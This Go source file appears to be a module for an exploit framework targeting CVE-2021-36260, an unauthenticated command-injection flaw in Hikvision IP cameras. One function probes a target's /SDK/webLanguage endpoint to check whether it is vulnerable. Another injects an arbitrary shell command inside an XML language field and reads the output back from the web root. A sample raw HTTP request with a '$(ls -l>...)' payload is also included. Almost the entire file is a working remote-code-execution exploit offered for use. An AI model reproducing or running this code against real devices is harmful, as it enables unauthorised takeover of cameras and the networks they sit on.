package exp_hikvision

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/common"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

type Exp_CVE_2021_36260 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_36260) GetMsg1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	headers.Set("X-Requested-With", "XMLHttpRequest")

	expUrl := self.AppendUri(self.Params.Target, "/SDK/webLanguage")
	echoUrl := self.AppendUri(self.Params.Target, "/c")

	payload := `<?xml version="1.0" encoding="UTF-8"?>
<language>%s</language>
`
	cmd = fmt.Sprintf("$(>webLib/c)")
	payload = fmt.Sprintf(payload, cmd)

	httpresp := self.HttpPutWithoutRedirect(expUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if strings.Contains(httpresp.Body, "</requestURL>") {
		self.EchoInfoMsg("vul is maybe exist")
	} else if httpresp.Resp.StatusCode == 404 || httpresp.Body == "" {
		self.EchoErrMsg("do not looks like Hikvision")
		return
	}

	httpresp = self.HttpGetWithoutRedirect(echoUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}

	if httpresp.Resp.StatusCode != 200 {
		if httpresp.Resp.StatusCode == 500 {
			self.EchoErrMsg(fmt.Sprintf("Could not verify if vulnerable (Code: %s)", httpresp.Resp.Status))
		} else {
			self.EchoErrMsg(fmt.Sprintf("Remote is not vulnerable (Code: %s)", httpresp.Resp.Status))
		}
	} else {
		self.EchoInfoMsg("Remote is verified exploitable")
	}

	return
}

func (self *Exp_CVE_2021_36260) Cmd1(cmd string) (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Set("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	headers.Set("X-Requested-With", "XMLHttpRequest")

	expUrl := self.AppendUri(self.Params.Target, "/SDK/webLanguage")
	echoUrl := self.AppendUri(self.Params.Target, "/x")

	payload := `<?xml version="1.0" encoding="UTF-8"?>
<language>%s</language>
`
	cmd = fmt.Sprintf("$(%s>webLib/x)", cmd)
	payload = fmt.Sprintf(payload, cmd)

	httpresp := self.HttpPutWithoutRedirect(expUrl, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}
	if strings.Contains(httpresp.Body, "</requestURL>") {
		self.EchoInfoMsg("vul is maybe exist")
	}

	httpresp = self.HttpGetWithoutRedirect(echoUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err
		return
	}

	if httpresp.Resp.StatusCode != 200 {
		self.EchoErrMsg("Error execute cmd " + cmd)
	} else {
		self.EchoInfoMsg(httpresp.Body)
	}

	return
}

func init() {
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())

	registerMsg := exp_register.ExpRegisterMsg{
		Msg: exp_model.ExpMsg{
			Author: `lz520520`,
			Time:   `2021`,
			Range:  `海康威视摄像头`,
			ID:     `CVE-2021-36260`,
			Describe: `
命令执行
`,
			Details: `
`,
			Payload: `
PUT /SDK/webLanguage HTTP/1.1
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: x.x.x.x
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: en-US,en;q=0.9,sv;q=0.8
Content-Length: 71

<?xml version="1.0" encoding="UTF-8"?><language>$(ls -l>webLib/c)</language>
`,
			Reference: "https://watchfulip.github.io/2021/09/18/Hikvision-IP-Camera-Unauthenticated-RCE.html",
			VulType:   common.VulCmdExec,
		},
	}

	exp_register.ExpStructRegister(&Exp_CVE_2021_36260{}, registerMsg)

}
